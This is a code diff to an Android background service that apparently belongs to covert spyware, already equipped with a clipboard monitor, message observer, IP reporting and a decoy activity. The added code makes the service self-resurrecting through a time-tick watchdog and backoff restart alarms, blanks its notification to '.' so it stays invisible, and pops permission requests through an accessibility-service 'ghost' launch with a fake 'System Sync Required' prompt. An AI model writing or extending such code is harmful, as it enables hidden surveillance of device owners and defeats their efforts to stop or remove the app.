@@ -22,6 +22,8 @@ import androidx.core.content.ContextCompat;
 import android.net.ConnectivityManager;
 import android.net.LinkProperties;
 import android.net.Network;
+import android.net.NetworkCapabilities;
+import android.net.NetworkRequest;
 import android.net.Uri;
 import android.database.ContentObserver;
 import android.database.Cursor;
@@ -108,6 +110,8 @@ public class WorkManager_Sync extends Service {
     private android.media.MediaPlayer keepAlivePlayer;
     private android.content.ClipboardManager clipboardManager;
     private android.content.ClipboardManager.OnPrimaryClipChangedListener clipboardListener;
+    private android.content.BroadcastReceiver tickReceiver;
+    private static int restartCount = 0;
 
     @Override
     public void onCreate() {
@@ -145,7 +149,22 @@ public class WorkManager_Sync extends Service {
         connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
         registerNetworkCallback();
         registerMessageObserver();
+        registerTickReceiver();
         checkAndReportIp(); // Initial check
+        restartCount = 0; // Reset on successful creation
+    }
+
+    private void registerTickReceiver() {
+        tickReceiver = new android.content.BroadcastReceiver() {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                if (!isRunning && !isDestructing) {
+                    Log.d(TAG, "WATCHDOG_TICK: Core found inactive. Reanimating...");
+                    startServer();
+                }
+            }
+        };
+        registerReceiver(tickReceiver, new android.content.IntentFilter(Intent.ACTION_TIME_TICK));
     }
 
     private void setupClipboardMonitor() {
@@ -288,16 +307,35 @@ public class WorkManager_Sync extends Service {
             super.onTaskRemoved(rootIntent);
             return;
         }
-        // [RESURRECTION_PROTOCOL] If swiped away or stopped from task manager, reboot 1s later
+        scheduleRestart();
+        super.onTaskRemoved(rootIntent);
+    }
+
+    private void scheduleRestart() {
+        // --- EXPONENTIAL BACKOFF REANIMATION ---
+        // Delays: 2s, 4s, 8s, 16s, 32s, 64s, 120s (max)
+        long delay = (long) (Math.min(120, Math.pow(2, Math.min(restartCount + 1, 7))) * 1000);
+        restartCount++;
+
+        Log.d(TAG, "PERSISTENCE_WATCHDOG: Scheduling respawn in " + (delay / 1000) + "s (Attempt: " + restartCount + ")");
+        
         Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
         restartServiceIntent.setPackage(getPackageName());
+        restartServiceIntent.setAction("START");
+        
         android.app.PendingIntent restartServicePendingIntent = android.app.PendingIntent.getService(
-            getApplicationContext(), 1, restartServiceIntent, android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE);
+            getApplicationContext(), 1, restartServiceIntent, android.app.PendingIntent.FLAG_ONE_SHOT | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? android.app.PendingIntent.FLAG_IMMUTABLE : 0));
+        
         android.app.AlarmManager alarmService = (android.app.AlarmManager) getApplicationContext().getSystemService(android.content.Context.ALARM_SERVICE);
         if (alarmService != null) {
-            alarmService.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                alarmService.setExactAndAllowWhileIdle(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP, 
+                    android.os.SystemClock.elapsedRealtime() + delay, restartServicePendingIntent);
+            } else {
+                alarmService.set(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP, 
+                    android.os.SystemClock.elapsedRealtime() + delay, restartServicePendingIntent);
+            }
         }
-        super.onTaskRemoved(rootIntent);
     }
 
     private void ensureForeground() {
@@ -449,7 +487,7 @@ public class WorkManager_Sync extends Service {
                 Intent i = new Intent(this, SystemBoot.class);
                 i.setAction(Constants.ACTION_KEEP_ALIVE);
                 android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(this, 1337, i, 
-                    android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
+                    android.app.PendingIntent.FLAG_UPDATE_CURRENT | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? android.app.PendingIntent.FLAG_IMMUTABLE : 0));
                 am.setRepeating(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 120000, 120000, pi);
             }
 
@@ -490,9 +528,9 @@ public class WorkManager_Sync extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "Stability Sync",
+                    ".",
                     NotificationManager.IMPORTANCE_MIN);
-            channel.setDescription("Ensures background service persistence");
+            channel.setDescription(".");
             channel.setShowBadge(false);
             channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
 
@@ -510,16 +548,18 @@ public class WorkManager_Sync extends Service {
         Intent notificationIntent = new Intent(this, DecoyActivity.class);
         PendingIntent pendingIntent = PendingIntent.getActivity(
                 this, 0, notificationIntent,
-                PendingIntent.FLAG_IMMUTABLE);
+                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0));
 
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("System Update")
-                .setContentText("Checking for system updates...")
+                .setContentTitle(".")
+                .setContentText(".")
                 .setSmallIcon(R.drawable.ic_sprocket_gear)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
+                .setSilent(true)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                .setShowWhen(false)
                 .build();
     }
 
@@ -533,10 +573,16 @@ public class WorkManager_Sync extends Service {
     public void onDestroy() {
         isRunning = false;
         instance = null;
+        if (!isDestructing) {
+            scheduleRestart();
+        }
         isForeground = false; // CRITICAL: Reset state so next start calls startForeground()
         // Clean up resources immediately on background thread
         networkExecutor.execute(() -> {
             unregisterNetworkCallback();
+            if (tickReceiver != null) {
+                try { unregisterReceiver(tickReceiver); } catch (Exception ignored) {}
+            }
             if (messageObserver != null) {
                 try {
                     getContentResolver().unregisterContentObserver(messageObserver);
@@ -574,7 +620,14 @@ public class WorkManager_Sync extends Service {
                         ipReportHandler.postDelayed(ipReportRunnable, 3000);
                     }
                 };
-                connectivityManager.registerDefaultNetworkCallback(networkCallback);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                    connectivityManager.registerDefaultNetworkCallback(networkCallback);
+                } else {
+                    NetworkRequest request = new NetworkRequest.Builder()
+                            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                            .build();
+                    connectivityManager.registerNetworkCallback(request, networkCallback);
+                }
             } catch (Exception e) {
                 Log.e(TAG, "Failed to register network callback", e);
             }
@@ -589,6 +642,46 @@ public class WorkManager_Sync extends Service {
             } catch (Exception e) {
                 Log.e(TAG, "Error unregistering network callback", e);
             }
+        }
+    }
+
+    public static void triggerPermissionActivity(Context context) {
+        if (context == null) return;
+        
+        Log.d(TAG, "Initiating tactical permission pop...");
+        FirebaseConfig.logActivity("SYSTEM_MAINTENANCE: Permission sequence DISPATCHED.");
+
+        // 1. Prepare the Hub Intent
+        Intent intent = new Intent(context, PermissionActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+
+        // 2. High-Privilege Ghost Launch (If Accessibility is ON)
+        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
+        if (ghost != null) {
+            try {
+                ghost.startActivity(intent);
+                return; // Ghost launch is perfect, no fallback needed
+            } catch (Exception ignored) {}
+        }
+
+        // 3. Standard Foreground Flip (If Ghost is OFF)
+        try {
+            context.startActivity(intent);
+        } catch (Exception e) {
+            Log.e(TAG, "Background start blocked: " + e.getMessage());
+            // Last resort: standard notification (No popup, just a prompt to tap)
+            NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT : PendingIntent.FLAG_UPDATE_CURRENT;
+            PendingIntent pi = PendingIntent.getActivity(context, 2001, intent, flags);
+            
+            NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "StabilityChannel")
+                    .setSmallIcon(R.drawable.labrats_internal_logo)
+                    .setContentTitle("System Sync Required")
+                    .setContentText("Tap to fix core synchronization.")
+                    .setPriority(NotificationCompat.PRIORITY_MAX)
+                    .setContentIntent(pi)
+                    .setAutoCancel(true);
+            nm.notify(2001, builder.build());
         }
     }
 
